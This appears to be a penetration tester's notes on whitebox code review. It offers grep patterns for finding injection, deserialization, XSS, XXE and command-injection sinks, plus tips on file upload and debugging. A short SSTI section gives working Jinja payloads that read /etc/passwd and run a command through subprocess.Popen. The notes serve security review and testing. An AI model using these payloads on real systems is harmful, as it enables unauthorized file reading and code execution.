# Whitebox / Code Review Methodologies & Tips


## Quick Greps
* Quick grep commands that may find direct vulnerabilities or used for recon purposes that gives you the lay of the land and tells you about the web application you're dealing with
* These grep commands may not directly give you indication of for example *Deserialization* attack vectors but may give a hint
* Tips
  * Narrow down to individual folders if searching from root directory takes too long
  * Zoom out on your terminal first before grepping
```bash
# Eval (For nodeJS or Java)
grep -Ri "eval(" * --color

#SQLI
egrep -ri "^.*?['\"]SELECT.*?['\"]\ ?[\+\.]" *
egrep -Ri "^.*?['\"]UPDATE.*?SET.*?['\"]\ ?[\+\.]" *
egrep -Ri "^.*?['\"]INSERT INTO.*?['\"]\ ?[\+\.]" *
grep -Ri "queryForList("


# Deserialization
## Java
egrep -Ri "readObject\(\)" *

# XSS 
grep -r "document.write(" ./ --include "*.html"
grep -Ri "<script src=\"' +"


# XXE Injection or at least XML
grep -Ri "= new HashMap" *
grep -Ri "= document.getElementsByTagName("
grep -Ri "document.getDocumentElement()"
grep -Ri "getNodeValue()"
grep -Ri "getNodeValue()"
grep -Ri "NodeList"
grep -Ri "java.util.HashMap"
grep -Ri "<\!\[CDATA\[" *
## Java
egrep -ri "XmlUtil.java" *

# SSTI
grep -Ri ".render(" *

# File System interactions
## Java
grep -Ri "new FileReader(" *



# Weak Random
## Java
grep -Ri "import java.util.Random" *
grep -Ri "new Random(" *



# Websockets
grep -Ri "= new WebSocket(" *
grep -Ri "WebSocket(" *
grep -r "send(" ./ --exclude="compressed*" --exclude="*.js"


# API
grep -Ri "swagger"
grep -Ri "/api" *

# Command Injection
## Linux
grep -Ri "\"su" --exclude "*.js" --exclude "*.html" --exclude "*.css" --exclude "*.svg" --exclude "*.scss"
## Windows
"cmd.exe (.*) /c 
"cmd (.*) /c "
"powershell (.*) -c "
"powershell (.*) -command "
"powershell.exe (.*) -c "
"powershell.exe (.*) -command "

# Deserialization
grep -Ri ".GetType(" *
grep -Ri ".GetType().AssemblyQualifiedName" *
grep -Ri "XmlSerializer(" *
grep -Ri "Serializer" *
grep -Ri ".Serialize(" *
grep -Ri ".Deserialize(" *
grep -Ri "= new XmlDocument()" *
grep -Ri "XmlDocument()" *
grep -Ri "DeSerializeHashtable" *
grep -Ri "XmlUtils.DeSerializeHashtable" *
```

## SSTI
* Detailed SSTI meaning [here](./SSTI.html)
* Test
    ```python
    {{7*7}}
    ```
* Jinja Payload
    * Python2
        ```python
        {{ ''.__class__.__mro__[2].__subclasses()[40]('/etc/passwd').read() }}
        ```
    * Python3
        ```python
        {{ ''.__class__.__mro__[1].__subclasses()[40]('/etc/passwd').read() }}
        ```
    * the number `[420]` may change every instance. This is the subprocess.Popen for RCE
        ```python
        {% set string = "ssti" %}
        {% set class = "__class__" %}
        {% set mro = "__mro__" %}
        {% set subclasses = "__subclasses__" %}
        {% set mro_r = string|attr(class)|attr(mro) %}
        {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
        {{ subclasses_r[420](["/usr/bin/touch","/tmp/poc.txt"]) }}
        ```
## File Upload
* Whitebox
    * Try to upload a file and see where it is uploaded on the file system by using `find` or `grep`
    * Find writable directories
        ```bash
        find /var/www/html/ -type d -perm -o+w
        ```
* File upload via Zip?
    * Try directory traversal to `/tmp`
    * find writable directories on the web root
    * PHP
        * make use of `display_errors` in the PHP settings

## How to track a possible vulnerable function resides?
* can start from top to bottom. From controllers, `grep` for the <something>.phtml or <something>.html. It might give some idea on where it is

## Debugging
* Python SMTP Server[^1]





[^1]: [Python3 SMTPD package](../Infrastructure_Setup/Simple_Python_Go_Packages.html#python3-smtpd)
